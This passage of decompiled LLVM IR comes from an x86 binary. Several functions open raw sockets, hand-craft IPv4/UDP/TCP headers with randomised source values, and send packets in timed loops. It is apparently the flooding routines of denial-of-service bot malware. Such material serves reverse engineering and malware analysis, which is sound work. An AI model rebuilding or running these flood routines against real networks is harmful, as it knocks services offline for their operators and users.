  %v3_8049616 = icmp eq i1 %v13_8049612, %v11_8049612
  %v4_8049616 = icmp eq i1 %v12_8049612, false
  %v5_8049616 = and i1 %v4_8049616, %v3_8049616
  br i1 %v5_8049616, label %dec_label_pc_804963e, label %dec_label_pc_8049618

dec_label_pc_8049618:                             ; preds = %dec_label_pc_8049612
  store i32 %arg1, i32* %stack_var_-1596, align 4
  %v3_804962d = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052d80.49 to i32))
  store i32 %v3_804962d, i32* @eax, align 4
  store i32 1, i32* %stack_var_-1596, align 4
  %v1_8049639 = call i32 @function_804f274(i32 1)
  br label %dec_label_pc_804963e

dec_label_pc_804963e:                             ; preds = %dec_label_pc_8049612, %dec_label_pc_8049618
  %v1_8049641 = add i32 %arg4, 4
  %v1_8049644 = inttoptr i32 %v1_8049641 to i32*
  %v2_8049644 = load i32, i32* %v1_8049644, align 4
  store i32 %arg2, i32* %stack_var_-1596, align 4
  %v3_8049650 = call i32 @function_8049520(i32 %arg2, i32 %v2_8049644)
  %v1_804965b = add i32 %arg4, 8
  %v1_804965e = inttoptr i32 %v1_804965b to i32*
  %v2_804965e = load i32, i32* %v1_804965e, align 4
  store i32 %v2_804965e, i32* %stack_var_-1596, align 4
  %v1_8049663 = call i32 @function_804f120(i32 %v2_804965e)
  %v1_804966e = add i32 %arg4, 12
  %v1_8049671 = inttoptr i32 %v1_804966e to i32*
  %v2_8049671 = load i32, i32* %v1_8049671, align 4
  store i32 %v2_8049671, i32* %stack_var_-1596, align 4
  %v1_8049676 = call i32 @function_804f120(i32 %v2_8049671)
  %v2_804967e = ptrtoint i32* %stack_var_-1560 to i32
  %tmp33 = bitcast i32* %stack_var_-1540 to i16*
  %v15_8049699 = ptrtoint i32* %stack_var_-1532 to i32
  store i32 %v15_8049699, i32* %stack_var_-1596, align 4
  %v4_80496b5 = bitcast i32* %stack_var_-1532 to i8*
  %v5_80496b5 = call i32 @function_804d4e0(i8* %v4_80496b5, i32 10, i32 1472)
  store i32 %arg1, i32* %stack_var_-1596, align 4
  %v3_80496db = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_8052da7.50 to i32))
  %v3_80496ea = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_80496ea, align 4
  %v1_80496fb = or i32 %v2_804967e, 1
  %v2_80496fb = inttoptr i32 %v1_80496fb to i8*
  store i8 0, i8* %v2_80496fb, align 1
  %v1_8049702 = or i32 %v2_804967e, 2
  %v2_8049702 = inttoptr i32 %v1_8049702 to i16*
  store i16 1500, i16* %v2_8049702, align 2
  %v1_804970b = add i32 %v2_804967e, 6
  %v2_804970b = inttoptr i32 %v1_804970b to i16*
  store i16 0, i16* %v2_804970b, align 2
  %v1_8049714 = add i32 %v2_804967e, 9
  %v2_8049714 = inttoptr i32 %v1_8049714 to i8*
  store i8 17, i8* %v2_8049714, align 1
  %v1_804971b = add i32 %v2_804967e, 8
  %v2_804971b = inttoptr i32 %v1_804971b to i8*
  store i8 64, i8* %v2_804971b, align 4
  %v2_8049725 = add i32 %v2_804967e, 16
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v3_8049650, i32* %v3_8049725, align 4
  %v1_804972b = urem i32 %tmp9, 65536
  store i32 %v1_804972b, i32* %stack_var_-1596, align 4
  %v1_8049731 = trunc i32 %tmp9 to i16
  %v2_8049731 = call i32 @function_804d778(i16 %v1_8049731)
  %v4_8049739 = ptrtoint i32* %stack_var_-1540 to i32
  %v1_804973c = trunc i32 %v2_8049731 to i16
  %v3_804973c = add i32 %v4_8049739, 4
  %v4_804973c = inttoptr i32 %v3_804973c to i16*
  store i16 %v1_804973c, i16* %v4_804973c, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i32 %v3_8049650, i32* @eax, align 4
  %v4_804975a = icmp eq i32 %v1_8049663, 0
  %v3_8049785 = or i32 %v4_8049739, 2
  %v4_8049785 = inttoptr i32 %v3_8049785 to i16*
  %v3_804979a = bitcast i32* %stack_var_-1560 to i16*
  %v3_80497a5 = add i32 %v4_8049739, 6
  %v4_80497a5 = inttoptr i32 %v3_80497a5 to i16*
  %v2_80497b3 = add i32 %v2_804967e, 12
  %v3_80497b3 = inttoptr i32 %v2_80497b3 to i32*
  %v3_80497c1 = add i32 %v2_804967e, 4
  %v4_80497c1 = inttoptr i32 %v3_80497c1 to i16*
  %v3_80497e1 = add i32 %v2_804967e, 10
  %v4_80497e1 = inttoptr i32 %v3_80497e1 to i16*
  %v2_80497f0 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804983b = add i32 %v1_8049676, %v2_80495c6
  %v1_8049763 = urem i32 %v1_8049663, 65536
  %v1_8049769 = trunc i32 %v1_8049663 to i16
  br label %dec_label_pc_804974c

dec_label_pc_804974c:                             ; preds = %dec_label_pc_8049855, %dec_label_pc_804963e
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_804963e ], [ %v4_8049855, %dec_label_pc_8049855 ]
  %v1_804974c = call i32 @function_804ed9c(i32 %v3_8049650)
  store i32 %v4_8049739, i32* @eax, align 4
  %v1_8049757 = trunc i32 %v1_804974c to i16
  store i16 %v1_8049757, i16* %tmp33, align 4
  br i1 %v4_804975a, label %dec_label_pc_804977a, label %dec_label_pc_8049760

dec_label_pc_8049760:                             ; preds = %dec_label_pc_804974c
  store i32 %v1_8049763, i32* %stack_var_-1596, align 4
  %v2_8049769 = call i32 @function_804d778(i16 %v1_8049769)
  br label %dec_label_pc_8049789

dec_label_pc_804977a:                             ; preds = %dec_label_pc_804974c
  %v0_804977a = load i32, i32* %stack_var_-1596, align 4
  %v1_804977a = call i32 @function_804ed9c(i32 %v0_804977a)
  br label %dec_label_pc_8049789

dec_label_pc_8049789:                             ; preds = %dec_label_pc_8049760, %dec_label_pc_804977a
  %storemerge4.in = phi i32 [ %v2_8049769, %dec_label_pc_8049760 ], [ %v1_804977a, %dec_label_pc_804977a ]
  %storemerge = trunc i32 %storemerge4.in to i16
  store i16 %storemerge, i16* %v4_8049785, align 2
  store i32 %v2_804967e, i32* %stack_var_-1596, align 4
  %v4_804979a = call i32 @function_80489a9(i16* %v3_804979a, i32 1500)
  %v1_80497a5 = trunc i32 %v4_804979a to i16
  store i16 %v1_80497a5, i16* %v4_80497a5, align 2
  %v0_80497a9 = call i32 @function_80483ee()
  store i32 %v2_804967e, i32* @eax, align 4
  store i32 %v0_80497a9, i32* %v3_80497b3, align 4
  %v0_80497b6 = load i32, i32* %stack_var_-1596, align 4
  %v1_80497b6 = call i32 @function_804ed9c(i32 %v0_80497b6)
  %v1_80497c1 = trunc i32 %v1_80497b6 to i16
  store i16 %v1_80497c1, i16* %v4_80497c1, align 4
  store i32 %v2_804967e, i32* %stack_var_-1596, align 4
  %v4_80497d6 = call i32 @function_80489a9(i16* %v3_804979a, i32 1500)
  %v1_80497e1 = trunc i32 %v4_80497d6 to i16
  store i16 %v1_80497e1, i16* %v4_80497e1, align 2
  store i32 %v4_80495f8, i32* %stack_var_-1596, align 4
  %v7_804981f = call i32 @function_804dce8(i32 %v4_80495f8, i32 %v2_804967e, i32 1500, i32 0, i32 %v2_80497f0, i32 16)
  store i32 %v7_804981f, i32* @eax, align 4
  %tmp = icmp ult i32 %stack_var_-40.0, 50
  br i1 %tmp, label %dec_label_pc_8049855, label %dec_label_pc_804982a

dec_label_pc_804982a:                             ; preds = %dec_label_pc_8049789
  store i32 0, i32* %stack_var_-1596, align 4
  %v2_8049831 = call i32 @function_804ba00(i32* null)
  store i32 %v5_804983b, i32* @eax, align 4
  %v7_804983e = icmp ult i32 %v2_8049831, %v5_804983b
  br i1 %v7_804983e, label %dec_label_pc_8049855, label %dec_label_pc_8049842

dec_label_pc_8049842:                             ; preds = %dec_label_pc_804982a
  store i32 0, i32* %stack_var_-1596, align 4
  %v1_8049849 = call i32 @function_804f274(i32 0)
  store i32 %v1_8049849, i32* @eax, align 4
  br label %dec_label_pc_8049855

dec_label_pc_8049855:                             ; preds = %dec_label_pc_8049842, %dec_label_pc_804982a, %dec_label_pc_8049789
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_8049789 ], [ 0, %dec_label_pc_804982a ], [ 0, %dec_label_pc_8049842 ]
  %v4_8049855 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_804974c

dec_label_pc_804985d:                             ; preds = %dec_label_pc_80495af
  ret i32 %v1_80495d4

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v4_8049739, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804967e, { 10, 11, 3, 12, 0, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v1_8049663, { 1, 0, 2 }
  uselistorder i32 %v4_8049612, { 1, 0 }
  uselistorder i32 %v4_80495f8, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1596, { 2, 3, 4, 5, 1, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049789, { 1, 0 }
  uselistorder label %dec_label_pc_804963e, { 1, 0 }
  uselistorder label %dec_label_pc_8049612, { 1, 0 }
}

define i32 @function_804985f(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804985f:
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804985f = load i32, i32* @ebp, align 4
  store i32 %v0_804985f, i32* %stack_var_-4, align 4
  %v4_804985f = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804985f, i32* @ebp, align 4
  %v2_8049868 = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v2_8049868, i32* %stack_var_-284, align 4
  %v3_8049883 = bitcast i32* %stack_var_-252 to i16*
  %v4_8049883 = call i32 @function_804d4b8(i16* %v3_8049883, i32 ptrtoint (i32* @global_var_8052de0.51 to i32), i32 80)
  store i32 0, i32* %stack_var_-284, align 4
  %v2_804989d = call i32 @function_804ba00(i32* null)
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v1_80498ab = call i32 @function_8048311(i32 %arg2)
  %v1_80498b0 = icmp eq i32 %v1_80498ab, 0
  %v1_80498b2 = icmp eq i1 %v1_80498b0, false
  br i1 %v1_80498b2, label %dec_label_pc_8049c56, label %dec_label_pc_80498b8

dec_label_pc_80498b8:                             ; preds = %dec_label_pc_804985f
  %v4_80498b8 = add i32 %arg3, -2
  %v9_80498b8 = sub i32 1, %arg3
  %v10_80498b8 = and i32 %v9_80498b8, %arg3
  %v11_80498b8 = icmp slt i32 %v10_80498b8, 0
  %v12_80498b8 = icmp eq i32 %v4_80498b8, 0
  %v13_80498b8 = icmp slt i32 %v4_80498b8, 0
  %v3_80498bc = icmp eq i1 %v13_80498b8, %v11_80498b8
  %v4_80498bc = icmp eq i1 %v12_80498b8, false
  %v5_80498bc = and i1 %v4_80498bc, %v3_80498bc
  br i1 %v5_80498bc, label %dec_label_pc_80498e4, label %dec_label_pc_80498be

dec_label_pc_80498be:                             ; preds = %dec_label_pc_80498b8
  store i32 %arg1, i32* %stack_var_-284, align 4
  %v2_80498d3 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052e30.52 to i32))
  store i32 %v2_80498d3, i32* @eax, align 4
  store i32 1, i32* %stack_var_-284, align 4
  %v1_80498df = call i32 @function_804f274(i32 1)
  br label %dec_label_pc_80498e4

dec_label_pc_80498e4:                             ; preds = %dec_label_pc_80498b8, %dec_label_pc_80498be
  store i32 2, i32* %stack_var_-284, align 4
  %v3_80498fb = call i32 @function_804dd68(i32 2, i32 3, i32 255)
  store i32 %v3_80498fb, i32* @eax, align 4
  %v5_8049903 = icmp slt i32 %v3_80498fb, 0
  %v1_8049907 = icmp eq i1 %v5_8049903, false
  br i1 %v1_8049907, label %dec_label_pc_8049932.preheader, label %dec_label_pc_8049909

dec_label_pc_8049909:                             ; preds = %dec_label_pc_80498e4
  store i32 1, i32* %stack_var_-284, align 4
  %v1_8049910 = call i32 @function_804f274(i32 1)
  br label %dec_label_pc_8049932.preheader

dec_label_pc_8049932.preheader:                   ; preds = %dec_label_pc_80498e4, %dec_label_pc_8049909
  br label %dec_label_pc_804991e

dec_label_pc_804991e:                             ; preds = %dec_label_pc_8049932.preheader, %dec_label_pc_804991e
  %storemerge72 = phi i32 [ 0, %dec_label_pc_8049932.preheader ], [ %v4_804992f, %dec_label_pc_804991e ]
  store i32 %storemerge72, i32* @edx, align 4
  %v0_8049924 = load i32, i32* @ebp, align 4
  %v2_8049924 = mul nuw nsw i32 %storemerge72, 4
  %v3_8049924 = add nuw nsw i32 %v2_8049924, -248
  %v4_8049924 = add i32 %v3_8049924, %v0_8049924
  %v5_8049924 = inttoptr i32 %v4_8049924 to i32*
  %v6_8049924 = load i32, i32* %v5_8049924, align 4
  %v1_804992b = trunc i32 %v6_8049924 to i8
  %v4_804992b = add nuw nsw i32 %storemerge72, -60
  %v5_804992b = add i32 %v4_804992b, %v0_8049924
  %v6_804992b = inttoptr i32 %v5_804992b to i8*
  store i8 %v1_804992b, i8* %v6_804992b, align 1
  %v4_804992f = add nuw nsw i32 %storemerge72, 1
  %exitcond = icmp eq i32 %v4_804992f, 20
  br i1 %exitcond, label %dec_label_pc_8049938, label %dec_label_pc_804991e

dec_label_pc_8049938:                             ; preds = %dec_label_pc_804991e
  %v1_804993b = add i32 %arg4, 4
  %v1_804993e = inttoptr i32 %v1_804993b to i32*
  %v2_804993e = load i32, i32* %v1_804993e, align 4
  store i32 %arg2, i32* %stack_var_-284, align 4
  %v2_804994a = call i32 @function_8049520(i32 %arg2, i32 %v2_804993e)
  %v1_8049955 = add i32 %arg4, 12
  %v1_8049958 = inttoptr i32 %v1_8049955 to i32*
  %v2_8049958 = load i32, i32* %v1_8049958, align 4
  store i32 %v2_8049958, i32* %stack_var_-284, align 4
  %v1_804995d = call i32 @function_804f120(i32 %v2_8049958)
  store i32 %arg1, i32* %stack_var_-284, align 4
  %v2_8049986 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052e57.53 to i32))
  store i8 69, i8* %stack_var_-104, align 1
  %v1_8049a25 = add i32 %arg4, 8
  %v1_8049a28 = inttoptr i32 %v1_8049a25 to i32*
  %v2_8049a28 = load i32, i32* %v1_8049a28, align 4
  store i32 %v2_8049a28, i32* %stack_var_-284, align 4
  %v1_8049a2d = call i32 @function_804f120(i32 %v2_8049a28)
  %v1_8049a32 = urem i32 %v1_8049a2d, 65536
  store i32 %v1_8049a32, i32* %stack_var_-284, align 4
  %v1_8049a38 = trunc i32 %v1_8049a2d to i16
  %v2_8049a38 = call i32 @function_804d778(i16 %v1_8049a38)
  %v1_8049a3d = urem i32 %v2_8049a38, 65536
  store i32 %v1_8049a3d, i32* @eax, align 4
  %v2_8049ae9 = ptrtoint i8* %stack_var_-104 to i32
  %v2_8049af7 = bitcast i8* %stack_var_-104 to i16*
  %v2_8049b83 = ptrtoint i32* %stack_var_-156 to i32
  %v2_8049b89 = ptrtoint i32* %stack_var_-144 to i32
  %v15_8049b8f = ptrtoint i32* %stack_var_-84 to i32
  %v12_8049bb3 = ptrtoint i32* %stack_var_-124 to i32
  %v15_8049bbd = ptrtoint i32* %stack_var_-64 to i32
  %v2_8049bdb = bitcast i32* %stack_var_-156 to i16*
  %v2_8049be7 = ptrtoint i32* %stack_var_-172 to i32
  %v5_8049c34 = add i32 %v1_804995d, %v2_804989d
  br label %dec_label_pc_8049a43

dec_label_pc_8049a43:                             ; preds = %dec_label_pc_8049c4e, %dec_label_pc_8049938
  %stack_var_-32.0 = phi i32 [ %v1_8049a3d, %dec_label_pc_8049938 ], [ %stack_var_-32.1, %dec_label_pc_8049c4e ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_8049938 ], [ %v4_8049c4e, %dec_label_pc_8049c4e ]
  %v1_8049a43 = call i32 @function_804ed9c(i32 %stack_var_-32.0)
  %v2_8049a51 = load i32, i32* %v1_8049a28, align 4
  store i32 %v2_8049a51, i32* %stack_var_-284, align 4
  %v1_8049a56 = call i32 @function_804f120(i32 %v2_8049a51)
  store i32 %v1_8049a56, i32* @eax, align 4
  %v1_8049a5b = icmp eq i32 %v1_8049a56, 0
  %v1_8049a5d = icmp eq i1 %v1_8049a5b, false
  br i1 %v1_8049a5d, label %dec_label_pc_8049a67, label %dec_label_pc_8049a5f

dec_label_pc_8049a5f:                             ; preds = %dec_label_pc_8049a43
  %v0_8049a5f = load i32, i32* %stack_var_-284, align 4
  %v1_8049a5f = call i32 @function_804ed9c(i32 %v0_8049a5f)
  br label %dec_label_pc_8049a67

dec_label_pc_8049a67:                             ; preds = %dec_label_pc_8049a43, %dec_label_pc_8049a5f
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049a43 ], [ %v1_8049a5f, %dec_label_pc_8049a5f ]
  %v0_8049a67 = call i32 @function_80483ee()
  store i32 60, i32* %stack_var_-284, align 4
  %v2_8049a7e = call i32 @function_804d778(i16 60)
  %v1_8049a83 = urem i32 %v2_8049a7e, 65536
  store i32 %v1_8049a83, i32* @eax, align 4
  %sext = mul i32 %v2_8049a7e, 65536
  %v1_8049a8a = sdiv i32 %sext, 65536
  %v2_8049a8a = call i32 @function_804ed9c(i32 %v1_8049a8a)
  %v1_8049aab = urem i32 %v1_8049a43, 65536
  store i32 %v1_8049aab, i32* %stack_var_-84, align 4
  %v1_8049ab5 = urem i32 %stack_var_-32.1, 65536
  store i32 %v1_8049ab5, i32* @eax, align 4
  %sext11 = mul i32 %v2_8049a8a, 65536
  %v1_8049abc = sdiv i32 %sext11, 65536
  %v2_8049abc = call i32 @function_804ed9c(i32 %v1_8049abc)
  store i32 2, i32* %stack_var_-172, align 4
  store i32 %v2_8049ae9, i32* %stack_var_-284, align 4
  %v3_8049af7 = call i32 @function_80489a9(i16* %v2_8049af7, i32 20)
  %v1_8049afc = urem i32 %v3_8049af7, 65536
  store i32 %v1_8049afc, i32* @eax, align 4
  %sext7 = mul i32 %v3_8049af7, 65536
  %v1_8049b03 = sdiv i32 %sext7, 65536
  %v2_8049b03 = call i32 @function_804ed9c(i32 %v1_8049b03)
  store i32 %v0_8049a67, i32* %stack_var_-156, align 4
  store i32 40, i32* %stack_var_-284, align 4
  %v2_8049b74 = call i32 @function_804d778(i16 40)
  store i32 %v15_8049b8f, i32* %stack_var_-284, align 4
  %v3_8049ba1 = call i32 @function_804d644(i32 %v15_8049b8f, i32 %v2_8049b89, i32 20)
  store i32 %v15_8049bbd, i32* %stack_var_-284, align 4
  %v3_8049bc3 = call i32 @function_804d644(i32 %v15_8049bbd, i32 %v12_8049bb3, i32 20)
  store i32 %v2_8049b83, i32* %stack_var_-284, align 4
  %v3_8049bdb = call i32 @function_80489a9(i16* %v2_8049bdb, i32 52)
  store i32 %v3_80498fb, i32* %stack_var_-284, align 4
  %v6_8049c18 = call i32 @function_804dce8(i32 %v3_80498fb, i32 %v2_8049ae9, i32 60, i32 0, i32 %v2_8049be7, i32 16)
  store i32 %v6_8049c18, i32* @eax, align 4
  %tmp = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp, label %dec_label_pc_8049c4e, label %dec_label_pc_8049c23

dec_label_pc_8049c23:                             ; preds = %dec_label_pc_8049a67
  store i32 0, i32* %stack_var_-284, align 4
  %v2_8049c2a = call i32 @function_804ba00(i32* null)
  store i32 %v5_8049c34, i32* @eax, align 4
  %v7_8049c37 = icmp ult i32 %v2_8049c2a, %v5_8049c34
  br i1 %v7_8049c37, label %dec_label_pc_8049c4e, label %dec_label_pc_8049c3b

dec_label_pc_8049c3b:                             ; preds = %dec_label_pc_8049c23
  store i32 0, i32* %stack_var_-284, align 4
  %v1_8049c42 = call i32 @function_804f274(i32 0)
  store i32 %v1_8049c42, i32* @eax, align 4
  br label %dec_label_pc_8049c4e

dec_label_pc_8049c4e:                             ; preds = %dec_label_pc_8049c3b, %dec_label_pc_8049c23, %dec_label_pc_8049a67
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_8049a67 ], [ 0, %dec_label_pc_8049c23 ], [ 0, %dec_label_pc_8049c3b ]
  %v4_8049c4e = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_8049a43

dec_label_pc_8049c56:                             ; preds = %dec_label_pc_804985f
  ret i32 %v1_80498ab

; uselistorder directives
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32 %v15_8049bbd, { 1, 0 }
  uselistorder i32 %v15_8049b8f, { 1, 0 }
  uselistorder i32 %v1_8049a3d, { 1, 0 }
  uselistorder i32 %v1_8049a2d, { 1, 0 }
  uselistorder i32 %storemerge72, { 2, 3, 0, 1 }
  uselistorder i32 %v3_80498fb, { 1, 0, 2, 3 }
  uselistorder i32 %v4_80498b8, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-284, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a67, { 1, 0 }
  uselistorder label %dec_label_pc_804991e, { 1, 0 }
  uselistorder label %dec_label_pc_8049932.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80498e4, { 1, 0 }
}

define i32 @function_8049c58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10) local_unnamed_addr {
dec_label_pc_8049c58:
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp45 = inttoptr i32 %arg1 to i8*
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-204 = alloca i8*, align 4
  store i8* null, i8** %stack_var_-204, align 4
  %v3_8049c70 = call i32 @function_804ba00(i32* null)
  %v4_8049c7b = inttoptr i32 %arg2 to i8*
  store i8* %v4_8049c7b, i8** %stack_var_-204, align 4
  %v2_8049c7e = call i32 @function_8048311(i32 %arg2)
  %v1_8049c83 = icmp eq i32 %v2_8049c7e, 0
  %v1_8049c85 = icmp eq i1 %v1_8049c83, false
  br i1 %v1_8049c85, label %dec_label_pc_8049fe3, label %dec_label_pc_8049c8b

dec_label_pc_8049c8b:                             ; preds = %dec_label_pc_8049c58
  %v4_8049c8b = add i32 %arg3, -1
  %v9_8049c8b = sub i32 0, %arg3
  %v10_8049c8b = and i32 %arg3, %v9_8049c8b
  %v11_8049c8b = icmp slt i32 %v10_8049c8b, 0
  %v12_8049c8b = icmp eq i32 %v4_8049c8b, 0
  %v13_8049c8b = icmp slt i32 %v4_8049c8b, 0
  %v3_8049c8f = icmp eq i1 %v13_8049c8b, %v11_8049c8b
  %v4_8049c8f = icmp eq i1 %v12_8049c8b, false
  %v5_8049c8f = and i1 %v4_8049c8f, %v3_8049c8f
  br i1 %v5_8049c8f, label %dec_label_pc_8049cb7, label %dec_label_pc_8049c91

dec_label_pc_8049c91:                             ; preds = %dec_label_pc_8049c8b
  store i8* %tmp45, i8** %stack_var_-204, align 4
  %v4_8049ca6 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_8052e70.54 to i32))
  store i32 %v4_8049ca6, i32* @eax, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-204, align 4
  %v2_8049cb2 = call i32 @function_804f274(i32 1)
  br label %dec_label_pc_8049cb7

dec_label_pc_8049cb7:                             ; preds = %dec_label_pc_8049c8b, %dec_label_pc_8049c91
  %v1_8049cba = add i32 %arg4, 8
  %v1_8049cbd = inttoptr i32 %v1_8049cba to i32*
  %v2_8049cbd = load i32, i32* %v1_8049cbd, align 4
  %v4_8049cbf = inttoptr i32 %v2_8049cbd to i8*
  store i8* %v4_8049cbf, i8** %stack_var_-204, align 4
  %v2_8049cc2 = call i32 @function_804f120(i32 %v2_8049cbd)
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-204, align 4
  %v5_8049ce1 = call i32 @function_804dd68(i32 2, i32 3, i32 255)
  store i32 %v5_8049ce1, i32* @eax, align 4
  %v5_8049ce9 = icmp slt i32 %v5_8049ce1, 0
  %v1_8049ced = icmp eq i1 %v5_8049ce9, false
  br i1 %v1_8049ced, label %dec_label_pc_8049cfb, label %dec_label_pc_8049cef

dec_label_pc_8049cef:                             ; preds = %dec_label_pc_8049cb7
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-204, align 4
  %v2_8049cf6 = call i32 @function_804f274(i32 1)
  br label %dec_label_pc_8049cfb

dec_label_pc_8049cfb:                             ; preds = %dec_label_pc_8049cb7, %dec_label_pc_8049cef
  store i8* null, i8** %stack_var_-204, align 4
  %v3_8049d02 = call i32 @function_804ba00(i32* null)
  store i32 %v3_8049d02, i32* @ebx, align 4
  %v0_8049d09 = call i32 @function_804b8fc()
  %v1_8049d0e = load i32, i32* @ebx, align 4
  %v2_8049d0e = xor i32 %v1_8049d0e, %v0_8049d09
  store i32 %v2_8049d0e, i32* @eax, align 4
  %v4_8049d10 = inttoptr i32 %v2_8049d0e to i8*
  store i8* %v4_8049d10, i8** %stack_var_-204, align 4
  %v2_8049d13 = call i32 @function_804eea0(i32 %v2_8049d0e)
  store i32 %v2_8049d13, i32* @eax, align 4
  %v0_8049d18 = load i8*, i8** %stack_var_-204, align 4
  %v1_8049d18 = ptrtoint i8* %v0_8049d18 to i32
  %v2_8049d18 = call i32 @function_804ed9c(i32 %v1_8049d18)
  store i32 %v2_8049d18, i32* @edx, align 4
  %v2_8049d2a = ptrtoint i8* %stack_var_-100 to i32
  %v15_8049d2d = ptrtoint i32* %stack_var_-60 to i32
  %tmp76 = bitcast i32* %stack_var_-60 to i8*
  store i8* %tmp76, i8** %stack_var_-204, align 4
  %v6_8049d33 = call i32 @function_804d4e0(i8* %tmp76, i32 %v2_8049d18, i32 1400)
  %v1_8049d3b = add i32 %arg4, 4
  %v1_8049d3e = inttoptr i32 %v1_8049d3b to i32*
  %v2_8049d3e = load i32, i32* %v1_8049d3e, align 4
  store i8* %v4_8049c7b, i8** %stack_var_-204, align 4
  %v4_8049d4a = call i32 @function_8049520(i32 %arg2, i32 %v2_8049d3e)
  store i8* %tmp45, i8** %stack_var_-204, align 4
  %v4_8049d73 = call i32 @function_80482b3(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_8052e94.55 to i32))
  %tmp77 = bitcast i8* %stack_var_-100 to i16*
  %v2_8049f0b = ptrtoint i32* %stack_var_-140 to i32
  %v15_8049f11 = ptrtoint i32* %stack_var_-80 to i32
  %tmp78 = bitcast i32* %stack_var_-80 to i8*
  %v3_8049f45 = ptrtoint i32* %stack_var_-120 to i32
  %tmp79 = bitcast i32* %stack_var_-152 to i8*
  %tmp80 = bitcast i32* %stack_var_-152 to i16*
  %v2_8049f69 = ptrtoint i32* %stack_var_-168 to i32
  %v4_8049f97 = inttoptr i32 %v5_8049ce1 to i8*
  %v5_8049fb6 = add i32 %v2_8049cc2, %v3_8049c70
  br label %dec_label_pc_8049d78

dec_label_pc_8049d78:                             ; preds = %dec_label_pc_8049fc4, %dec_label_pc_8049cfb
  %stack_var_-32.0 = phi i32 [ %tmp14, %dec_label_pc_8049cfb ], [ %v4_8049fc4, %dec_label_pc_8049fc4 ]
  %v0_8049d78 = call i32 @function_80483ee()
  store i8 69, i8* %stack_var_-100, align 1
  store i8* inttoptr (i32 1440 to i8*), i8** %stack_var_-204, align 4
  %v3_8049da9 = call i32 @function_804d778(i16 1440)
  %v1_8049dae = urem i32 %v3_8049da9, 65536
  store i32 %v1_8049dae, i32* @eax, align 4
  %sext = mul i32 %v3_8049da9, 65536
  %v1_8049db5 = sdiv i32 %sext, 65536
  %v2_8049db5 = call i32 @function_804ed9c(i32 %v1_8049db5)
  store i32 %v4_8049d4a, i32* @eax, align 4
  %sext12 = mul i32 %v2_8049db5, 65536
  %v1_8049de1 = sdiv i32 %sext12, 65536
  %v2_8049de1 = call i32 @function_804ed9c(i32 %v1_8049de1)
  %v1_8049de6 = urem i32 %v2_8049de1, 65536
  store i32 %v1_8049de6, i32* @eax, align 4
  store i32 %v1_8049de6, i32* %stack_var_-80, align 4
  %v1_8049ded = call i32 @function_804ed9c(i32 %v1_8049de6)
  %v1_8049df2 = urem i32 %v1_8049ded, 65536
  store i32 %v1_8049df2, i32* @eax, align 4
  %sext9 = mul i32 %v1_8049ded, 65536
